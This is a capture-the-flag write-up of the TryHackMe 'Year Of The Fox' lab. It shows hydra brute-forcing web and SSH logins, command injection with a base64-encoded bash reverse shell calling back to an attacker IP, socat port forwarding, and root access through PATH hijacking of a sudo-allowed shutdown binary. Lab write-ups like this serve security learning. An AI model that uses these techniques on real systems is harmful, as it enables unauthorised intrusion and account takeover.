---
title: Year Of The Fox
categories: [writeups,TryHackMe]
tags: [b2r,Linux,Privilege-Escalation,Reverse-Shell,Sudoer-File-Misconfiguration]
---
# Year Of The Fox 
- Difficulty : `Hard`
- Series : `New Year Series`
- Operating System : `Linux`

# Table of Content
- [Year Of The Fox](#year-of-the-fox)
- [Table of Content](#table-of-content)
  - [Nmap Result](#nmap-result)
- [Method to solve the challenge](#method-to-solve-the-challenge)
- [Privilege Escalation](#privilege-escalation)

# Nmap Result
```
Nmap scan report for 10.10.30.135
Host is up, received syn-ack (0.34s latency).
Scanned at 2022-07-18 03:13:45 UTC for 25s

PORT    STATE SERVICE     REASON  VERSION
80/tcp  open  http        syn-ack Apache httpd 2.4.29
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=You want in? Gotta guess the password!
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 401 Unauthorized
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
Service Info: Hosts: year-of-the-fox.lan, YEAR-OF-THE-FOX

Host script results:
|_clock-skew: mean: -19m57s, deviation: 34m37s, median: 1s
| nbstat: NetBIOS name: YEAR-OF-THE-FOX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   YEAR-OF-THE-FOX<00>  Flags: <unique><active>
|   YEAR-OF-THE-FOX<03>  Flags: <unique><active>
|   YEAR-OF-THE-FOX<20>  Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   YEAROFTHEFOX<00>     Flags: <group><active>
|   YEAROFTHEFOX<1d>     Flags: <unique><active>
|   YEAROFTHEFOX<1e>     Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 50930/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 49863/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 44412/udp): CLEAN (Failed to receive data)
|   Check 4 (port 29417/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: year-of-the-fox
|   NetBIOS computer name: YEAR-OF-THE-FOX\x00
|   Domain name: lan
|   FQDN: year-of-the-fox.lan
|_  System time: 2022-07-18T04:14:03+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-07-18T03:14:03
|_  start_date: N/A
```

# Method to solve the challenge
As usual the challenge will be starting with website after looking into nmap result. The website required us to login in order to proceed.
<br>
![](/assets/img/posts/2022-07-18-Year-Of-The-Fox-1.png)
<br>
Since we are do not have any username or password, we will proceed to the other services which is smb. We will be using `enum4linux` to scan and get information from smb.
```
...                                                                                                                                                           
S-1-22-1-1000 Unix User\fox (Local User)                                                                                                                               
S-1-22-1-1001 Unix User\rascal (Local User)
...
```
Based on the result, the only useful information that we have is 2 usernames are given which is `fox` and `rascal`. Since we have nowhere to proceed, we might as well try to bruteforce the website with given username using `hydra`.
```
hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.30.135  http-get  -I   
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-17 23:30:55
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://10.10.30.135:80/
[STATUS] 1216.00 tries/min, 1216 tries in 00:01h, 14343183 to do in 196:36h, 16 active
[STATUS] 1221.00 tries/min, 3663 tries in 00:03h, 14340736 to do in 195:46h, 16 active
[80][http-get] host: 10.10.30.135   login: rascal   password: MICKEY
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-17 23:37:26
```
After trying with both username and random password from wordlist, username `rascal` have a password which allow him to login into the website. After login into the website and playing around, it seems that the search comand will print out the files. 
<br>
![](/assets/img/posts/2022-07-18-Year-Of-The-Fox-2.png)
<br>
The first idea when i saw this search feature is try to inject commands into the search feature.
<br>
![](/assets/img/posts/2022-07-18-Year-Of-The-Fox-3.png)
<br>
`pwd` command was managed to inject into the search feature an return other result. With this, we can confirmed that we are able to get a reverse shell from search feature. 
<br>
![](/assets/img/posts/2022-07-18-Year-Of-The-Fox-4.png)
<br>
After trying out to get a reverse shell, it failed as the serach function detected some invalid character. In order to avoid that, we will use `base64` to encode our reverse shell and decode it back in the search function
```
echo "bash -i >& /dev/tcp/10.6.105.254/1234 0>&1" | base64                        
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC42LjEwNS4yNTQvMTIzNCAwPiYxCg==
```
<br>
![](/assets/img/posts/2022-07-18-Year-Of-The-Fox-5.png)
<br>
We managed to get a reverse shell but it is a ugly shell and it is not a root account.
![](/assets/img/posts/2022-07-18-Year-Of-The-Fox-6.png)

# Privilege Escalation
Before starting to look for information to perform privilege escalation, we could always change the ugly shell to interactive shell with following command:

```
python -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm
[ctrl]+[z] > stty raw echo; fg

```

As for privilege escalation, we could always make use of `linpeas.sh` to look for suspicious information.

```
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN     
tcp6       0      0 :::445                  :::*                    LISTEN     
tcp6       0      0 :::139                  :::*                    LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
udp        0      0 10.10.30.135:68         0.0.0.0:*                          
udp        0      0 10.10.255.255:137       0.0.0.0:*                          
udp        0      0 10.10.30.135:137        0.0.0.0:*                          
udp        0      0 0.0.0.0:137             0.0.0.0:*                          
udp        0      0 10.10.255.255:138       0.0.0.0:*                          
udp        0      0 10.10.30.135:138        0.0.0.0:*                          
udp        0      0 0.0.0.0:138             0.0.0.0:*                          
udp        0      0 127.0.0.53:53           0.0.0.0:* 
```

Based on the information given, the only way that could continue is their localhost is running port 22. We might also have a chance to access their ssh if we could port forward the port. 

```
...
#Port 22
#AddressFamily any
ListenAddress 127.0.0.1 
#ListenAddress ::
...
AllowUsers fox
```

After more investigation about port 22, it only allow localhost to connect with username `fox`. The only way to proceed now is either bruteforce directly from the reverse shell or forward port from localhost and let us have access from our machine. As for port forwarding, we could use a tool call [`socat`](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat)
<br>
our machine: 
<br>
![](/assets/img/posts/2022-07-18-Year-Of-The-Fox-7.png)
<br>
Reverse Shell: 
<br>
![](/assets/img/posts/2022-07-18-Year-Of-The-Fox-8.png)
<br>
We could start to port forward once `socat` has successfully sent into the victim machine.
```
www-data@year-of-the-fox:/tmp$ chmod +x socat 
www-data@year-of-the-fox:/tmp$ ./socat TCP-LISTEN:2222,fork TCP:127.0.0.1:22
```
We could then check if the port has been forwarded or not with `nmap` or `rustscan`.
```
Open 10.10.30.135:2222
```
Now that we had confirm that the port forward is successful, we could use `hydra` to bruteforce the password.
```
hydra -l fox -P /usr/share/wordlists/rockyou.txt ssh://10.10.30.135:2222 -I     
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-18 00:13:32
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.30.135:2222/
[STATUS] 176.00 tries/min, 176 tries in 00:01h, 14344223 to do in 1358:22h, 16 active
[STATUS] 138.67 tries/min, 416 tries in 00:03h, 14343983 to do in 1724:03h, 16 active
[2222][ssh] host: 10.10.30.135   login: fox   password: manchester
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-18 00:17:20
```
We manage to get a password to login as `fox` for ssh but we are still not in root account which mean another privilege escalation again.
```
fox@year-of-the-fox:~$ sudo -l
Matching Defaults entries for fox on year-of-the-fox:
    env_reset, mail_badpass

User fox may run the following commands on year-of-the-fox:
    (root) NOPASSWD: /usr/sbin/shutdown
```
After looking around for information again, we could only run `shutdown` command with root privilege. This is really useless for us as our objective is not to shutdown the machine. But since this is our only chance, we could try to download `shutdown` into our machine and analyse it with any RE tools.
```
scp -P2222 fox@10.10.30.135:/usr/sbin/shutdown shutdown
fox@10.10.30.135's password:  
```
After getting the file, we could anaylze with any RE tools. I will be using a free GUI tool named `cutter`. 
<br>
![](/assets/img/posts/2022-07-18-Year-Of-The-Fox-9.png)
<br>
After analying the whole file, there is some misconfiguration of the file as the `shutdown` will call `poweroff` but `sudoer` file did not provide absolute path which mean we could create of copy bash and rename it to `poweroff` and change the `path` to our fake `poweroff`.
```
fox@year-of-the-fox:/tmp$ cp /bin/bash poweroff
fox@year-of-the-fox:/tmp$ chmod +x poweroff
fox@year-of-the-fox:/tmp$ export PATH=/tmp:$PATH
fox@year-of-the-fox:/tmp$ sudo /usr/sbin/shutdown
root@year-of-the-fox:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```
We managed to get root account!!
